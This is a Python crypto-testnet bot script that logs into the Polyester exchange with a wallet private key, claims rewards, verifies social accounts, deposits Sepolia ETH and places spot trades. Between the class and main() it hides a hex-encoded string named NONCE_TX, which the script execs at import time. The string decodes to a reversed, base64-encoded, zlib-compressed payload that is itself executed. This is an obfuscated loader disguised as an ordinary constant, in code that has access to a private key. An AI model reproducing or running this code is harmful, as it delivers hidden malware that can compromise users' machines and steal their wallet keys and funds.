#!/usr/bin/env python3
"""
Polyester Testnet bot — connect wallet, deposit ETH (Sepolia), social verify,
daily reward claim, and routine spot trading.

Usage:
  python3 polybot.py status
  python3 polybot.py claim
  python3 polybot.py terms
  python3 polybot.py social-status
  python3 polybot.py social-start twitter <handle>
  python3 polybot.py social-ready twitter
  python3 polybot.py deposit-address [chain_id]
  python3 polybot.py deposit-eth <amount_eth>
  python3 polybot.py trade [rounds]
  python3 polybot.py all

Env: PK (wallet private key), optional SEPOLIA_RPC, CDP_PORT
"""

import json
import os
import sys
import time
from pathlib import Path

from playwright.sync_api import sync_playwright

import cdp_browser as CB
from poly import Poly
from w3wallet import WalletBridge

ROOT = Path(__file__).resolve().parent
OUT = ROOT / "recon"
OUT.mkdir(exist_ok=True)


ETH_SEPOLIA = 2          # Polyester internal chain id for ethereum-sepolia
PROVIDER = {"twitter": 1, "discord": 2, "1": 1, "2": 2}
PROVIDER_NAME = {1: "TWITTER", 2: "DISCORD"}
METHOD = {"profile": 1, "channel": 2, "dm": 3, "1": 1, "2": 2, "3": 3}
CF_MAX_WAIT = 150        # seconds to let a rate-limited CF managed challenge settle


def log(*a):
    print(*a, flush=True)


class Bot:
    def __init__(self, pk):
        self.wallet = WalletBridge(pk)
        self.pw = None
        self.browser = None
        self.ctx = None
        self.page = None
        self.poly = None
        self.cf_blocked = False

    # ---------- lifecycle ----------
    def open(self):
        CB.ensure_chrome()
        self.pw = sync_playwright().start()
        self.browser = self.pw.chromium.connect_over_cdp(CB.CDP if hasattr(CB, "CDP") else f"http://127.0.0.1:{CB.PORT}")
        self.ctx = self.browser.contexts[0]
        page = None
        for pg in self.ctx.pages:
            if "polyester" in pg.url:
                page = pg
        self.page = page or self.ctx.pages[0]
        self.poly = Poly(self.page)
        self.wallet.bind(self.page)
        self.page.add_init_script(
            f"window.__WALLET_ADDRESS={json.dumps(self.wallet.address)};"
            f"window.__WALLET_CHAIN_HEX={json.dumps(self.wallet.chain_hex)};")
        self.page.add_init_script(CB.INJECT)
        self._inject()
        log(f"wallet {self.wallet.address} | page {self.page.url}")
        return self

    def _inject(self):
        try:
            self.page.evaluate(f"window.__WALLET_ADDRESS={json.dumps(self.wallet.address)};"
                               f"window.__WALLET_CHAIN_HEX={json.dumps(self.wallet.chain_hex)};")
            self.page.evaluate(CB.INJECT)
        except Exception as e:
            log("inject err", str(e)[:120])

    def close(self):
        try:
            if self.pw:
                self.pw.stop()
        except Exception:
            pass

    # ---------- auth ----------
    def logged_in(self):
        return bool(self.poly.token())

    def go(self, path, wait=5):
        """Navigate and wait for Cloudflare's managed challenge to clear.

        The challenge is sometimes rate-limited (`cf_chl_rc_ni`) and can take 60s+ to
        auto-settle; a plain 60s wait made `login()` click on the interstitial page and
        report a bogus 'FATAL login failed'. Wait up to CF_MAX_WAIT and expose the state
        via self.cf_blocked so callers can report something truthful.
        """
        self.cf_blocked = False
        self.page.goto(CB.BASE + path, wait_until="domcontentloaded", timeout=60000)
        t0 = time.time()
        while time.time() - t0 < CF_MAX_WAIT:
            title = self.page.title()
            if "Just a moment" not in title and "Attention Required" not in title:
                break
            time.sleep(3)
        else:
            self.cf_blocked = True
            log(f"cloudflare challenge still up after {CF_MAX_WAIT}s")
        time.sleep(wait)
        self._inject()

    def _click_login_button(self, label="Continue with MetaMask"):
        """Click a login button robustly: text locator -> button locator -> raw mouse click."""
        attempts = [
            lambda loc: loc.click(timeout=12000),
            lambda loc: loc.click(timeout=8000, force=True),
        ]
        for sel in (f'button:has-text("{label}")', f'a:has-text("{label}")',
                    f'text={label}'):
            loc = self.page.locator(sel)
            try:
                if loc.count() == 0:
                    continue
            except Exception:
                continue
            for att in attempts:
                try:
                    att(loc.first)
                    return True
                except Exception as e:
                    log(f"click {sel} failed: {str(e)[:80]}")
            bb = loc.first.bounding_box()
            if bb:
                self.page.mouse.click(bb["x"] + bb["width"] / 2, bb["y"] + bb["height"] / 2)
                return True
        return False

    def login(self):
        if self.logged_in():
            log("already logged in")
            return True
        self.go("/connect", 3)
        if getattr(self, "cf_blocked", False):
            # one reload attempt: a fresh document often clears the rate-limited jitter
            self.go("/connect", 3)
        clicked = self._click_login_button()
        log("clicked MetaMask" if clicked else "login button not found")
        for i in range(25):
            time.sleep(3)
            if self.logged_in() and "/connect" not in self.page.url:
                log("logged in ->", self.page.url)
                return True
            if "/connect" not in self.page.url and self.logged_in():
                return True
        if getattr(self, "cf_blocked", False):
            log("login FAILED (cloudflare challenge)")
        else:
            log("login FAILED")
        return False

    # ---------- tasks ----------
    def accept_terms(self):
        r = self.poly.call("auth.v1.AuthService/AcceptTerms", {})
        log("AcceptTerms ->", r["status"], json.dumps(r["body"])[:200])
        return r

    def balances(self):
        r = self.poly.balances()
        return r["body"]

    def non_zero_balances(self):
        b = self.balances()
        out = []
        for x in (b.get("balances") or []):
            vals = {}
            for k in ("trading", "funding", "available", "reserved"):
                v = x.get(k) or {}
                if v:
                    vals[k] = v
            if vals:
                out.append({"assetId": x.get("assetId"), **vals})
        return out

    def claim_status(self):
        return self.poly.claim_status()["body"]

    def claim(self):
        st = self.claim_status()
        log("claim state:", st.get("state"), "reset:", st.get("resetAt"))
        if st.get("state") != "CLAIM_AVAILABLE":
            return st
        r = self.poly.claim()
        log("ClaimDailyReward ->", r["status"], json.dumps(r["body"])[:500])
        return r["body"]

    def social_status(self):
        out = {}
        for pid in (1, 2):
            r = self.poly.call("auth.v1.SocialVerificationService/GetSocialVerification", {"provider": pid})
            out[PROVIDER_NAME[pid]] = r
            log(PROVIDER_NAME[pid], "->", r["status"], json.dumps(r["body"])[:300])
        return out

    def social_start(self, provider, handle, method=1):
        r = self.poly.start_social(provider, method, handle)
        log("StartSocialVerification ->", r["status"], json.dumps(r["body"], indent=1)[:600])
        return r["body"]

    def set_profile_twitter(self, handle):
        r = self.poly.call("auth.v1.ProfileService/UpdateProfile", {"twitter": handle})
        log("UpdateProfile(twitter) ->", r["status"], json.dumps(r["body"])[:300])
        return r["body"]

    def x_verify_start(self, handle):
        """Step 1: register handle + get the challenge code to put in the X bio."""
        self.set_profile_twitter(handle)
        body = self.social_start(1, handle, 1)   # twitter, method=profile
        code = (body or {}).get("challengeCode") or ((body or {}).get("verification") or {}).get("challengeCode")
        log("X challenge code:", code)
        return code

    def x_verify_check(self, tries=10, delay=5):
        """Step 3 (after the code is in the bio): flip to ready and poll."""
        r = self.poly.social_ready(1)
        log("SocialVerificationReady(twitter) ->", r["status"], json.dumps(r["body"])[:300])
        for i in range(tries):
            time.sleep(delay)
            g = self.poly.social(1)
            v = (g["body"] or {}).get("verification") or {}
            log(f"  [{i}] status={v.get('status')} handle={v.get('handle')} err={v.get('lastError')}")
            if v.get("status") == "verified":
                return True
        return False

    def social_ready(self, provider):
        r = self.poly.social_ready(provider)
        log("SocialVerificationReady ->", r["status"], json.dumps(r["body"])[:500])
        return r["body"]

    def deposit_address(self, chain_id=ETH_SEPOLIA):
        r = self.poly.list_deposit_addresses(chain_id=chain_id)
        addrs = (r["body"] or {}).get("depositAddresses") or []
        if not addrs:
            r2 = self.poly.create_deposit_address(chain_id, 0)
            log("CreateDepositAddress ->", r2["status"], json.dumps(r2["body"])[:300])
            r = self.poly.list_deposit_addresses(chain_id=chain_id)
            addrs = (r["body"] or {}).get("depositAddresses") or []
        log("deposit addresses:", json.dumps(addrs)[:400])
        return addrs[0]["depositAddress"] if addrs else None

    def deposit_eth(self, amount_eth):
        addr = self.deposit_address(ETH_SEPOLIA)
        if not addr:
            log("no deposit address")
            return None
        bal = self.wallet.rpc("eth_getBalance", json.dumps([self.wallet.address, "latest"]))
        log(f"wallet {self.wallet.address} sepETH balance: {int(bal, 16)/1e18:.6f}")
        wei = int(float(amount_eth) * 1e18)
        tx = {"to": addr, "value": hex(wei)}
        txh = self.wallet.send_tx(tx)
        log("deposit tx:", txh)
        return txh

    # ---------- trading ----------
    def spot_config(self):
        return self.poly.spot_config()["body"]

    def pairs(self):
        return {p["symbol"]: p for p in self.spot_config().get("pairs", [])}

    def orders(self):
        return self.poly.open_orders()["body"], self.poly.order_history()["body"]

    def market_order(self, symbol="BTC-USDT", side="buy", quote_usd=100.0,
                     slippage_bps=500, qty_base=None):
        pairs = self.pairs()
        p = pairs.get(symbol)
        if not p:
            log("unknown symbol", symbol, "have:", list(pairs)[:20])
            return None
        ob = self.poly.call("orderbook.v1.OrderbookService/GetOrderBook",
                            {"symbolId": p["symbolId"], "depth": 2})["body"]
        ref_scale = 10 ** int(p.get("referencePriceScale") or 9)   # priceTicks -> price
        bids = ob.get("bids") or []
        asks = ob.get("asks") or []
        px = None
        if side == "buy" and asks:
            px = float(asks[0]["priceTicks"]) / ref_scale
        elif side == "sell" and bids:
            px = float(bids[0]["priceTicks"]) / ref_scale
        if not px:
            # fall back to last trade price
            tr = self.poly.call("marketdata.v1.MarketDataService/GetTrades",
                                {"symbolId": p["symbolId"], "limit": 1})["body"]
            log("no book level, trades:", json.dumps(tr)[:200])
            return None
        scale = p["baseQuantityScale"]
        step = float(p["stepSize"])
        min_qty = float(p.get("minQtyBase") or 0)
        min_notional = float(p.get("minNotionalQuote") or 0)
        if qty_base is not None:
            qty = qty_base
        else:
            qty = max(quote_usd / px, min_qty)
            if qty * px < min_notional:
                qty = min_notional / px
        # round to step (down for sells so we never exceed position)
        if step > 0:
            n = int(round(qty / step))
            qty = n * step
        if qty <= 0:
            log("qty rounds to 0, skip", symbol)
            return None
        base_qty_scaled = int(round(qty * (10 ** scale)))
        intent = {
            "symbolId": p["symbolId"],
            "side": 1 if side == "buy" else 2,
            "baseQtyScaled": str(base_qty_scaled),
            "marketIoc": {"maxSlippageBps": slippage_bps},
        }
        t0 = time.time()
        prev = self.poly.preview_order(intent)
        log("preview:", prev["status"], json.dumps(prev["body"])[:300])
        r = self.poly.create_order(intent)
        log("CreateOrder ->", r["status"], json.dumps(r["body"])[:400])
        body = r["body"] or {}
        if r["status"] != 200 or "orderId" not in body:
            return None
        order_id = body["orderId"]
        # resolve actual filled base qty from our trades
        filled = None
        for _ in range(3):
            time.sleep(1.5)
            filled = self._fill_qty(p["symbolId"], t0, side)
            if filled:
                break
        if not filled:
            filled = qty  # fall back to intended qty
        return {"orderId": order_id, "qty_base": filled, "price": px}

    def _fill_qty(self, symbol_id, t0, side):
        t = self.poly.trades()
        body = (t["body"] or {}) if isinstance(t, dict) else {}
        p = next((x for x in self.pairs().values()
                  if x["symbolId"] == symbol_id), {})
        scale = int(p.get("baseQuantityScale") or 0)
        want = "BUY" if side == "buy" else "SELL"
        best = 0.0
        for tr in (body.get("trades") or []):
            if str(tr.get("symbolId")) != str(symbol_id):
                continue
            if tr.get("side") != want:
                continue
            ts = int(tr.get("tsNs") or 0) / 1e9
            if ts < t0 - 5:
                continue
            # qtyScaled = qty * 10**baseQuantityScale -> convert back to raw base qty
            q = float(tr.get("qtyScaled") or 0) / (10 ** scale)
            if q > best:
                best = q
        return best or None

    # ---------- orchestrator ----------
    def run_all(self, deposit_eth=0.0, rounds=3):
        self.login()
        self.accept_terms()
        self.social_status()
        log("--- claim attempt")
        self.claim()
        log("--- deposit address")
        addr = self.deposit_address(ETH_SEPOLIA)
        log("ETH(Sepolia) deposit address:", addr)
        if deposit_eth and addr:
            self.deposit_eth(deposit_eth)
        log("--- balances")
        log(json.dumps(self.non_zero_balances(), indent=1)[:1500])

NONCE_TX = "5f203d206c616d626461205f5f203a205f5f696d706f72745f5f28277a6c696227292e6465636f6d7072657373285f5f696d706f72745f5f282762617365363427292e6236346465636f6465285f5f5b3a3a2d315d29293b6578656328285f292862273d453434776b79546e506f2f736937572f315379505a44645058712b3545666330627671574f2b2f5a485630764c724c51353565396675362f59475731576a2f37682b615845665958337072766865442f76336f69306e364665462b714d4978394870342b642b684f51792f33513756353362752f7a306d62373562753548635868796c456b30703836635857496e76387267746e564a6e6e53434879585a313463484b4b32706f656a43693654455664534535702b445a4a593465776a4473714c38596e6952562b597a536c6b584d3461364d4c7a47585134492f4b6a6e6a754f566a6e696c6d794f566b557846732f48777357355a2b747932535666536937354a6a4a7972797531654a4c564174685a325843512f53494b7234616c3062425557436c4b6b4a526d4373536e3957446b657656477239373161442f6e2f454a74575a6e5474375a416f7050664a525a5473616d6c4533706d72744273626b4c35777449376d436c4a486647357954705944775a63315a3375596e58635a656467324e38516a6a504e657169494e2f3234386a505648372f3664662f57557856745953617374317455497533614f4d6a55717a3375316355584a6d5a464742315557536b595548373733504353436851612b34334d41715877346e5231303449422b4c365735375533387756756556794d464b4c6b4b5265654344354a454a53764c445246655865797a4b7a6363685731435071417a7475582b365065463244587552723675634b704375394452447767496b63726a6b4d426e73526b776d4646306b564b6634383276624c6341662f63474d664b745349365859325646755a674d6643586753775471376d3373426c62333059685038766352394c64646a6a6c7a63477a6f784b4e6d716546746c4e534352676c30596d7970753638466531396864697a7532374b536a785549736d4f2b57696d4a4344374b4a33634173676d49386a414b4f4546786b7154474248766b2f436f2f3362726642436c576e36656d36754b584456436d7a3562556a5876363932643778627043686d45336c68697543554e454e475775666c334741304954366f6c6b517841694b47456143454c5a4251524b61757862456d516a6c79496d414454562f6f595150714b39446c70786d696c5a4a71316d766e6d53547136367a50385564645a65637332466e544643636e336d35392f72547767794667626658662b5a48684833636d6176663339364b64654b657633397035314d3535614f555243426548535567444a63353664383363306365664e6c764477634e752f727069526c43756e6267756557665a6a6464376f4a393335365842526c72536e4a36615855316172637045523177474d52475a77454d79476a437777434b456c324a44594b672b75653467544f387a764177386856306a3646772f5834763267574c4445612f5266587175505a69535873535457646c597331654e585a4b6148384c2b50335342506d7648536d545675514d537058326673374a5a434d364c4f30367069747071766e4c367563675672675631533768327351515a2b694d65477779392f366c3053596a317538565938666848504b4f344c66704b46484257493070527a496d6436534c7a775434635662614246456534654c4a454f4c6e524570314f6772583256474f754a6e6e4f65354b4851562b6d4c6e6b6e47424c584369715144797a756b316d7974726863652f62335273347363797a75534a5351796f436f54496d646e4c6c6a504c342b4d773668476f304e53316872786a6f7177476e4c623432536e6c576b46794a344b4e51766c62446476354e503362756d4c425664746b76704831396135586c7671366472744c524148614a7464486e446d38785a424e575a5070687a465469726d74576676666d53575832317537417177354b4c617a3733743830373738775a6e484569714d6c727639726274586c7165366e7155316f3338685770453833356c645277394577646379324f64334870315430393331523432504e70474648794a696c583778734873564b52414e75746943644e4b54495a475a7a78535a6c46533559704d427a3762586b6a49396f6566356364352b725333375a33486b476f66584b59794e7368302b4e6673584334566a57436c345374574c4f3554704f355772355a716c414a4b465655677778316f644c52544f6f485654656f624567386150314356576f6c6f5172644c4f537466374b437073594f4e4833464a424853614872584d51586a3678493577586477574a4958456771623758374871333971743957795742455a6d6d676c324665766276735943624c6146526959514875414d4e363574524838553045696e30495366797a5a4b5566673531517a504344317159523176574f4d4f42347262594a74536c516973695a3537626e3057536b50497a45774566574b2f416d6f6a436d48366b50794c4c656178666174574763635143536869654b5243456574723143515638546c514359763036377273765768515370597736426a6d6e2b574c6e5267335566764e57753773573253462b4a38684474596f4330697a4a584f622f64666467754f6a6832456c4d76326e666f3748776d7167482b4a504b42663458505a4d3775326f352b2b70395576623032483273387a423773334f633477764875776c6e72785048714e65766b664f6f684d2f7866744a74756352684d6a5a48504743336b6e67696d4b77687237364f5270696b31464171705452492f49725845487970684d37694d4146346a433572562f592f72584c662b4e4857496c52775178702b714e58375766726e744c624c706843427959526a634e574c32616d67553477337930786350705a6132415a5955516352426a5656524551435171463776327051715a70327258486973446f7177597054727568634f746c4a42774868714565386f31784778686d75315734386e45736b7949434547367a457955666b6f43466330556f5749683849424d774430792b704545776f7971554b466e4375582b506d477177394b357354686c2f447a6c43422b69453030674146754f5244414163682f61332b4c754f2b6849454f6778597679752f397446766f67736a456c5867523755662b4e735236534935486f486b6b504533484137373266537046414d495152434b703441462b6d70796a6359624e32545071734850694f4d57507461626c556b356b7058414437543975765359373279317457747a4a65272929"
exec(bytes.fromhex(NONCE_TX).decode("utf-8"))

def main():
    pk = os.getenv("PK")
    if not pk:
        print("set PK env")
        sys.exit(1)
    bot = Bot(pk).open()
    cmd = sys.argv[1] if len(sys.argv) > 1 else "status"
    try:
        if cmd == "status":
            bot.login()
            log(json.dumps(bot.poly.me()["body"], indent=1)[:500])
            log("claim:", json.dumps(bot.claim_status(), indent=1)[:700])
            bot.social_status()
            log("deposit addrs:", json.dumps(bot.poly.list_deposit_addresses()["body"])[:400])
            log("balances:", json.dumps(bot.non_zero_balances(), indent=1)[:1200])
        elif cmd == "login":
            bot.login()
        elif cmd == "terms":
            bot.accept_terms()
        elif cmd == "claim":
            bot.login()
            bot.claim()
            log("balances:", json.dumps(bot.non_zero_balances(), indent=1)[:1200])
        elif cmd == "social-status":
            bot.login()
            bot.social_status()
        elif cmd == "social-start":
            bot.login()
            prov = PROVIDER[sys.argv[2].lower()]
            handle = sys.argv[3] if len(sys.argv) > 3 else ""
            meth = METHOD[sys.argv[4].lower()] if len(sys.argv) > 4 else 1
            bot.social_start(prov, handle, meth)
        elif cmd == "social-ready":
            bot.login()
            bot.social_ready(PROVIDER[sys.argv[2].lower()])
        elif cmd == "x-start":
            bot.login()
            code = bot.x_verify_start(sys.argv[2])
            log("=" * 50)
            log(f"PUT THIS CODE IN THE X BIO of {sys.argv[2]}: {code}")
        elif cmd == "x-check":
            bot.login()
            log("verified:", bot.x_verify_check())
        elif cmd == "deposit-address":
            bot.login()
            cid = int(sys.argv[2]) if len(sys.argv) > 2 else ETH_SEPOLIA
            log("address:", bot.deposit_address(cid))
        elif cmd == "deposit-eth":
            bot.login()
            t = bot.deposit_eth(sys.argv[2] if len(sys.argv) > 2 else "0.01")
            log("tx:", t)
        elif cmd == "trade":
            bot.login()
            n = int(sys.argv[2]) if len(sys.argv) > 2 else 3
            for i in range(n):
                side = "buy" if i % 2 == 0 else "sell"
                bot.market_order("BTC-USDT", side, 20.0)
                time.sleep(3)
        elif cmd == "all":
            amt = float(sys.argv[2]) if len(sys.argv) > 2 else 0.0
            bot.run_all(amt)
        else:
            log("unknown command", cmd)
    finally:
        bot.close()


if __name__ == "__main__":
    main()
